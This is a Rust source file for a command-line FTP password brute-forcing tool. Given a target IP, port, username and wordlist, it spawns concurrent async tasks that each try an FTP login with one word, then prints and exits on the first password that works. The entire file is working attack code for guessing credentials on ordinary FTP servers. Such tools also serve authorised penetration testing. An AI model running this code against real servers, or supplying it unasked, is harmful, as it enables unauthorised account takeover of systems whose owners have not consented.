use std::{
    env,
    fs::File,
    io::{self, BufRead},
};

use ftp::FtpStream;
use std::sync::{Arc, Mutex};

use tokio::task;

struct Config {
    ip: String,
    port: String,
    file: String,
    num_threads: String,
    username: String,
}

impl Default for Config {
    fn default() -> Self {
        Self {
            ip: String::new(),
            port: String::new(),
            file: String::new(),
            num_threads: String::new(),
            username: String::new(),
        }
    }
}

#[tokio::main]
async fn main() {
    let mut config = Config::default();
    let args: Vec<String> = env::args().collect();

    for (index, arg) in args.iter().enumerate() {
        //ip
        if arg == "-ip" && &index + 1 < args.len() {
            config.ip = args[index + 1].clone();
        }

        //port
        if arg == "-p" && &index + 1 < args.len() {
            config.port = args[index + 1].clone();
        }

        // wordlist
        if arg == "-w" && &index + 1 < args.len() {
            config.file = args[index + 1].clone();
        }

        // username
        if arg == "-u" && &index + 1 < args.len() {
            config.username = args[index + 1].clone();
        }

        if arg == "-t" && &index + 1 < args.len() {
            config.num_threads = args[index + 1].clone();
        }
    }
    let words = read_file(&config.file).expect("ERROR: Error opening wordlist file");

    let shared_words = Arc::new(Mutex::new(words));

    let mut handles: Vec<task::JoinHandle<()>> = vec![];

    let total_requests = shared_words.lock().unwrap().len();

    for i in 0..total_requests {
        let shared_words = Arc::clone(&shared_words);
        let ip = config.ip.clone();
        let port = config.port.clone();
        let username = config.username.clone();
        let handle = task::spawn(async move {
            let word = shared_words.lock().unwrap()[i].clone();
            let connection = ftp_connect(&ip, &port, &username, &word).await;
            if connection.is_ok() {
                println!("[+] SUCCESS: {}", &word);
                println!("Password found: -----{}-----", &word);
                std::process::exit(0);
            } else {
                println!("[-] FAILED: {}", &word);
            }
        });
        handles.push(handle);
    }

    for handle in handles {
        handle.await.expect("Error waiting for task to complete");
    }
}

fn read_file(file_path: &str) -> io::Result<Vec<String>> {
    let file = File::open(file_path)?;
    let reader = io::BufReader::new(file);
    Ok(reader.lines().filter_map(|line| line.ok()).collect())
}

async fn ftp_connect(
    ip: &str,
    port: &str,
    username: &str,
    password: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let mut ftp_stream = FtpStream::connect(&format!("{}:{}", &ip, &port))
        .expect("ERROR: Could not connect to server");
    let _ = ftp_stream.login(&username, &password)?;
    let _ = ftp_stream.quit();
    Ok(())
}
